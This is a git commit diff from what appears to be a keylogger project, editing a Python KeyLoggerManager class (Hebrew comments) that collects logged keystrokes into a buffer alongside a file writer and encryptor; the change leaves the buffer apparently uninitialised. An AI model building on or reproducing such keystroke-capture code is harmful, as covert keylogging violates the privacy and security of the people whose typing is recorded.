3781b3c4e86c570851d25781723d59ef371ff038
efraim gottlieb <efgo583208979@gmail.com>
2025-09-01 14:58:40 +0300

    12

--- manager.py
+++ manager.py
@@ -4,13 +4,12 @@ class KeyLoggerManager:
         self.file_writer = file_writer
         self.encryptor = encryptor
         self.interval = interval  # כל כמה שניות לאסוף
-        self.buffer = []  # מאגר ביניים לשמירת ההקלדות
-        self.running = False
     def collect_keys(self):
-        keys = self.keylogger_service.get_logged_keys()
+        keys = self.keylogger_service.get_keys()
         if keys:
             self.buffer.extend(keys)
-            self.keylogger_service.clear_logged_keys()  # פונקציה אופציונלית שתאפס את הלוג
+
+
 
 
     def start(self):
